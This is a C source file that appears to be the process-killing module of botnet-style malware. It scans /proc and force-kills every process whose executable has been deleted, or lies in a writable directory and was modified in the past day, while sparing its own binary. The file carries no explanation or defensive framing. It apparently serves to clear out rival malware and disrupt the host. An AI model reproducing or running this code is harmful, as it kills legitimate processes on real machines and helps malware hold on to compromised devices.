#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>


// Global variable
int killer_pid = 0;

char check_write_date(char *real_path) {
    struct stat file_stat;

    if (stat(real_path, &file_stat) == 0) {
        // Get the current time
        time_t current_time = time(NULL);

        time_t time_difference = current_time - file_stat.st_ctime;

        if (time_difference < 86400) {
            return 0;
        } else {
            return 1;
        }
    }

    return 1;
}

char check_write_path(char *real_path) {
    char *dir_path = strdup(real_path);
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash != NULL) {
        *last_slash = '\0'; 
    }

    if (access(dir_path, W_OK) == 0) {
        free(dir_path);
        return 1;
    }

    free(dir_path);
    return 0;
}

char check_self_path(char *real_path) {
    int len;
    char self_path[64];

    if ((len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) == -1) {
        return 0;
    }

    self_path[len] = 0;

    if (!strcmp(real_path, self_path)) {
        return 0;
    }

    return 1;
}

char check_delete_path(char *real_path) {
    if (strstr(real_path, "(deleted)") != NULL) {
        return 0;
    } 

    return 1;
}

char check_safe_path(char *real_path) {
    if (!check_self_path(real_path)) {
        return 1;
    }
    if (!check_delete_path(real_path)) {
        return 0;
    }
    if (!check_write_path(real_path)) {
        return 1;
    }
    if (!check_write_date(real_path)) {
        return 0;
    }

    return 1;
}

char check_real_path(char *pid) {
    int len;
    char exe_path[20], real_path[64];

    strcpy(exe_path, "/proc/");
    strcat(exe_path, pid);
    strcat(exe_path, "/exe");

    if ((len = readlink(exe_path, real_path, sizeof(real_path) - 1)) == -1) {
        return 1;
    }

    real_path[len] = 0;

    if (!check_safe_path(real_path)) {
        return 0;
    }

    return 1;
}

char clean(void) {

    DIR *dir;
    if ((dir = opendir("/proc/")) == NULL) {
        return 0;
    }

    struct dirent *file;

    while ((file = readdir(dir))) {
        if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;

        if (!check_real_path(file->d_name)) {
            kill(atoi(file->d_name), SIGKILL);
            #ifdef DEBUG
            printf("Killed %d\n", atoi(file->d_name));
            #endif
        }
    }

    closedir(dir);
    
    #ifdef DEBUG
    printf("System is now clean\n");
    #endif
    return 1;
    
}


